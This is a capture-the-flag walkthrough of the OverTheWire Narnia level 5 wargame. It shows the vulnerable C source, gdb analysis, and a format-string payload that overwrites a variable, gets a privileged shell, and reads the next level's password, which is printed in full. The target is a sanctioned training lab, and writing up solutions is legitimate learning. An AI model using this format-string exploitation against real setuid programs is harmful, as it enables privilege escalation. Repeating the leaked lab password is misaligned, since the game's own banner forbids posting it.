#### Narnia Level 4 → Level 5

```sh
➜  ~ ssh narnia5@narnia.labs.overthewire.org -p 2226
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
narnia5@narnia.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

narnia5@narnia:~$
```

```sh
narnia5@narnia:~$ cd /narnia/
narnia5@narnia:/narnia$ ll
total 116
drwxr-xr-x  2 root    root    4096 Nov  9 15:08 ./
drwxr-xr-x 25 root    root    4096 Nov 21 07:46 ../
-r-sr-x---  1 narnia1 narnia0 7568 Nov  9 15:08 narnia0*
-r--r-----  1 narnia0 narnia0 1186 Nov  9 15:08 narnia0.c
-r-sr-x---  1 narnia2 narnia1 7404 Nov  9 15:08 narnia1*
-r--r-----  1 narnia1 narnia1 1000 Nov  9 15:08 narnia1.c
-r-sr-x---  1 narnia3 narnia2 5164 Nov  9 15:08 narnia2*
-r--r-----  1 narnia2 narnia2  999 Nov  9 15:08 narnia2.c
-r-sr-x---  1 narnia4 narnia3 5836 Nov  9 15:08 narnia3*
-r--r-----  1 narnia3 narnia3 1841 Nov  9 15:08 narnia3.c
-r-sr-x---  1 narnia5 narnia4 5336 Nov  9 15:08 narnia4*
-r--r-----  1 narnia4 narnia4 1064 Nov  9 15:08 narnia4.c
-r-sr-x---  1 narnia6 narnia5 5700 Nov  9 15:08 narnia5*
-r--r-----  1 narnia5 narnia5 1261 Nov  9 15:08 narnia5.c
-r-sr-x---  1 narnia7 narnia6 6076 Nov  9 15:08 narnia6*
-r--r-----  1 narnia6 narnia6 1602 Nov  9 15:08 narnia6.c
-r-sr-x---  1 narnia8 narnia7 6676 Nov  9 15:08 narnia7*
-r--r-----  1 narnia7 narnia7 1974 Nov  9 15:08 narnia7.c
-r-sr-x---  1 narnia9 narnia8 5232 Nov  9 15:08 narnia8*
-r--r-----  1 narnia8 narnia8 1292 Nov  9 15:08 narnia8.c
narnia5@narnia:/narnia$
```

```sh
narnia5@narnia:/narnia$ cat narnia5.c
```

```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
```

```sh
narnia5@narnia:/narnia$ ./narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffffd62c)
narnia5@narnia:/narnia$
```

```sh
narnia5@narnia:/narnia$ ./narnia5 "$(python -c 'import sys; sys.stdout.write("\x41\x41\x41\x41%000x%01$p")')"
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAc2670xc267] (14)
i = 1 (0xffffd61c)
narnia5@narnia:/narnia$
```

```sh
narnia5@narnia:/narnia$ gdb -q ./narnia5
Reading symbols from ./narnia5...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804850d <+0>:	push   %ebp
   0x0804850e <+1>:	mov    %esp,%ebp
   0x08048510 <+3>:	push   %ebx
   0x08048511 <+4>:	and    $0xfffffff0,%esp
   0x08048514 <+7>:	sub    $0x60,%esp
   0x08048517 <+10>:	movl   $0x1,0x5c(%esp)
   0x0804851f <+18>:	mov    0xc(%ebp),%eax
   0x08048522 <+21>:	add    $0x4,%eax
   0x08048525 <+24>:	mov    (%eax),%eax
   0x08048527 <+26>:	mov    %eax,0x8(%esp)
   0x0804852b <+30>:	movl   $0x40,0x4(%esp)
   0x08048533 <+38>:	lea    0x1c(%esp),%eax
   0x08048537 <+42>:	mov    %eax,(%esp)
   0x0804853a <+45>:	call   0x80483f0 <snprintf@plt>
   0x0804853f <+50>:	movb   $0x0,0x5b(%esp)
   0x08048544 <+55>:	movl   $0x8048670,(%esp)
   0x0804854b <+62>:	call   0x8048380 <printf@plt>
   0x08048550 <+67>:	mov    0x5c(%esp),%eax
   0x08048554 <+71>:	cmp    $0x1f4,%eax
   0x08048559 <+76>:	jne    0x804858b <main+126>
   0x0804855b <+78>:	movl   $0x8048691,(%esp)
   0x08048562 <+85>:	call   0x80483a0 <puts@plt>
   0x08048567 <+90>:	call   0x8048390 <geteuid@plt>
   0x0804856c <+95>:	mov    %eax,%ebx
   0x0804856e <+97>:	call   0x8048390 <geteuid@plt>
   0x08048573 <+102>:	mov    %ebx,0x4(%esp)
   0x08048577 <+106>:	mov    %eax,(%esp)
   0x0804857a <+109>:	call   0x80483c0 <setreuid@plt>
   0x0804857f <+114>:	movl   $0x8048696,(%esp)
   0x08048586 <+121>:	call   0x80483b0 <system@plt>
   0x0804858b <+126>:	movl   $0x80486a0,(%esp)
   0x08048592 <+133>:	call   0x80483a0 <puts@plt>
   0x08048597 <+138>:	lea    0x1c(%esp),%eax
   0x0804859b <+142>:	mov    %eax,(%esp)
   0x0804859e <+145>:	call   0x80483d0 <strlen@plt>
   0x080485a3 <+150>:	mov    %eax,0x8(%esp)
   0x080485a7 <+154>:	lea    0x1c(%esp),%eax
   0x080485ab <+158>:	mov    %eax,0x4(%esp)
   0x080485af <+162>:	movl   $0x80486c1,(%esp)
   0x080485b6 <+169>:	call   0x8048380 <printf@plt>
   0x080485bb <+174>:	mov    0x5c(%esp),%eax
   0x080485bf <+178>:	lea    0x5c(%esp),%edx
   0x080485c3 <+182>:	mov    %edx,0x8(%esp)
   0x080485c7 <+186>:	mov    %eax,0x4(%esp)
   0x080485cb <+190>:	movl   $0x80486d5,(%esp)
   0x080485d2 <+197>:	call   0x8048380 <printf@plt>
   0x080485d7 <+202>:	mov    $0x0,%eax
   0x080485dc <+207>:	mov    -0x4(%ebp),%ebx
   0x080485df <+210>:	leave
---Type <return> to continue, or q <return> to quit---
   0x080485e0 <+211>:	ret
End of assembler dump.
(gdb) break *0x0804853a
Breakpoint 1 at 0x804853a
(gdb) r "$(python -c 'import sys; sys.stdout.write("\x41\x41\x41\x41%000x%01$p")')"
Starting program: /narnia/narnia5 "$(python -c 'import sys; sys.stdout.write("\x41\x41\x41\x41%000x%01$p")')"

Breakpoint 1, 0x0804853a in main ()
(gdb) x/16x $esp
0xffffd5b0:	0xffffd5cc	0x00000040	0xffffd7f9	0x0000c267
0xffffd5c0:	0xffffffff	0x0000002f	0xf7e23dc8	0xf7fcb000
0xffffd5d0:	0x00008000	0xf7fc7000	0x00000000	0xf7e2f32a
0xffffd5e0:	0x00000002	0x00000000	0xf7e45830	0x0804863b
(gdb) c
Continuing.
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAc2670xc267] (14)
i = 1 (0xffffd60c)
[Inferior 1 (process 16210) exited normally]
(gdb)
```

```sh
narnia5@narnia:/narnia$ ./narnia5 "$(python -c 'import sys; sys.stdout.write("\x1c\xd6\xff\xff%496x%05$n")')"
Change i's value from 1 -> 500. GOOD
$ id
uid=14006(narnia6) gid=14005(narnia5) groups=14005(narnia5)
$ cat /etc/narnia_pass/narnia6
neezocaeng
$
```

[``Solution``](https://www.lukeaddison.co.uk/blog/narnia-level-5/)
